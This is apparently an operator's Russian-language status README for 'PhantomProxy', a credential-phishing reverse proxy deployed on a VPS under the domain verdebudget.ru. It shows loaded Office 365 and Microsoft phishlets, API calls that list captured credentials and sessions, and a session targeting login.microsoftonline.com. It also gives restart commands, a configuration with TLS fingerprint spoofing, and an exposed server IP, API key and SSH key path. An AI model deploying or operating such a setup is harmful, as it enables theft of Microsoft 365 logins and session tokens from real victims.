# ✅ PhantomProxy Работает на VPS verdebudget.ru

**IP:** 212.233.93.147  
**Статус:** ✅ РАБОТАЕТ

---

## 🎉 Текущее Состояние

### ✅ Что Работает:

| Компонент | Статус | URL |
|-----------|--------|-----|
| **API Server** | ✅ Работает | http://212.233.93.147:8080 |
| **Phishlets** | ✅ Загружено 2 | o365, verdebudget_microsoft |
| **Database** | ✅ SQLite | ~/phantom-proxy/phantom.db |
| **ML Detector** | ✅ Rule-based | Включен |
| **Service Worker** | ✅ Включен | /sw.js |

### ⚠️ Временные Ограничения:

| Компонент | Статус | Причина |
|-----------|--------|---------|
| **HTTPS** | ⚠️ Требует фикса | uTLS spoofing конфликтует с Let's Encrypt |
| **HTTP/3** | ❌ Отключен | Требует порт 443 (root права) |

---

## 🚀 Быстрый Доступ

### API Endpoints

```bash
# Health Check
curl http://212.233.93.147:8080/health

# Статистика
curl http://212.233.93.147:8080/api/v1/stats \
  -H "Authorization: Bearer verdebudget-secret-2026"

# Сессии
curl http://212.233.93.147:8080/api/v1/sessions \
  -H "Authorization: Bearer verdebudget-secret-2026"

# Phishlets
curl http://212.233.93.147:8080/api/v1/phishlets \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

### Ответы:

```json
// Health
{"status":"ok","timestamp":"2026-02-18T12:40:38Z"}

// Stats
{
  "active_phishlets": 2,
  "active_sessions": 0,
  "phishlets_loaded": 2,
  "total_credentials": 0,
  "total_sessions": 0
}
```

---

## 🔧 Управление Сервером

### Подключение

```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147
```

### Проверка Статуса

```bash
# Процесс
ps aux | grep phantom-proxy

# Порты
netstat -tlnp | grep -E '8080|8443'

# Логи
tail -f ~/phantom.log
```

### Перезапуск

```bash
cd ~/phantom-proxy
pkill -f phantom-proxy
./phantom-proxy -config config.yaml > phantom.log 2>&1 &
```

### Остановка

```bash
pkill -f phantom-proxy
```

---

## 📝 Конфигурация

### Расположение

```bash
~/phantom-proxy/
├── config.yaml           # Конфигурация
├── phantom-proxy         # Бинарник
├── phantom.db            # База данных
├── certs/
│   ├── cert.pem         # SSL сертификат (Let's Encrypt)
│   └── key.pem          # SSL ключ
└── configs/phishlets/
    ├── o365.yaml
    └── verdebudget_microsoft.yaml
```

### Текущая Конфигурация

```yaml
bind_ip: "0.0.0.0"
https_port: 8443
domain: "verdebudget.ru"
cert_path: "./certs/cert.pem"
key_path: "./certs/key.pem"
database_path: "./phantom.db"
phishlets_path: "./configs/phishlets"
api_enabled: true
api_port: 8080
api_key: "verdebudget-secret-2026"
debug: true
serviceworker_enabled: true
ml_detection: true
http3_enabled: false  # Отключен (требует root)
```

---

## 🎣 Тестирование Фишлета

### 1. Добавьте в hosts (локально)

**Windows:** `C:\Windows\System32\drivers\etc\hosts`  
**Linux/Mac:** `/etc/hosts`

```
212.233.93.147 login.verdebudget.ru
212.233.93.147 api.verdebudget.ru
```

### 2. Откройте в браузере

```
https://login.verdebudget.ru:8443
```

**Примечание:** Из-за uTLS spoofing может потребоваться принять сертификат вручную.

### 3. Альтернатива: Используйте IP

```
https://212.233.93.147:8443
```

---

## 🔐 SSL Сертификаты

### Текущие: Let's Encrypt

**Путь:** `/etc/letsencrypt/live/verdebudget.ru/`

**Обновление:**

```bash
# Автоматическое обновление (Certbot)
sudo certbot renew

# Копирование в PhantomProxy
sudo cp /etc/letsencrypt/live/verdebudget.ru/fullchain.pem ~/phantom-proxy/certs/cert.pem
sudo cp /etc/letsencrypt/live/verdebudget.ru/privkey.pem ~/phantom-proxy/certs/key.pem

# Перезапуск
pkill -f phantom-proxy
cd ~/phantom-proxy && ./phantom-proxy -config config.yaml > phantom.log 2>&1 &
```

---

## 📊 API Примеры

### Создание Сессии

```bash
curl -X POST http://212.233.93.147:8080/api/v1/sessions \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{"target_url": "https://login.microsoftonline.com"}'
```

### Получение Креденшалов

```bash
curl http://212.233.93.147:8080/api/v1/credentials \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

### Активация Phishlet

```bash
curl -X POST http://212.233.93.147:8080/api/v1/phishlets/verdebudget_microsoft/enable \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

---

## 🐛 Решение Проблем

### API Не Отвечает

```bash
# Проверка процесса
ps aux | grep phantom-proxy

# Проверка портов
netstat -tlnp | grep 8080

# Перезапуск
pkill -f phantom-proxy
cd ~/phantom-proxy && ./phantom-proxy -config config.yaml > phantom.log 2>&1 &
```

### HTTPS Не Работает

**Проблема:** uTLS spoofing конфликтует с Let's Encrypt

**Временное решение:** Используйте HTTP для API

```bash
# API работает через HTTP
curl http://212.233.93.147:8080/api/v1/stats \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

**Постоянное решение:** Отключить uTLS spoofing в коде

### Phishlet Не Загружается

```bash
# Проверка файла
cat ~/phantom-proxy/configs/phishlets/verdebudget_microsoft.yaml

# Перезагрузка phishlets
pkill -f phantom-proxy
./phantom-proxy -config config.yaml > phantom.log 2>&1 &
```

---

## 📈 Мониторинг

### Статистика в Реальном Времени

```bash
watch -n 5 'curl -s http://localhost:8080/api/v1/stats \
  -H "Authorization: Bearer verdebudget-secret-2026" | python3 -m json.tool'
```

### Логи

```bash
# В реальном времени
tail -f ~/phantom.log

# Последние 100 строк
tail -100 ~/phantom.log

# Ошибки
grep -i error ~/phantom.log
```

---

## ✅ Итоговый Чеклист

- [x] PhantomProxy установлен
- [x] API работает (0.0.0.0:8080)
- [x] Phishlets загружены (2 шт)
- [x] SSL сертификаты Let's Encrypt
- [x] Database SQLite
- [x] ML Detector включен
- [x] Service Worker включен
- [ ] HTTPS uTLS (требует фикса)
- [ ] HTTP/3 (требует порт 443)

---

## 📞 Контакты

**Сервер:** 212.233.93.147  
**API Port:** 8080  
**HTTPS Port:** 8443  
**API Key:** verdebudget-secret-2026

**Документация:**
- `VPS_DEPLOYMENT.md` - Полная инструкция
- `TEST_VERDEBUDGET.md` - Тестирование
- `FINAL_REPORT_v1.0.md` - Отчёт о проекте

---

**🎉 PhantomProxy v1.0.0-dev готов к использованию!**
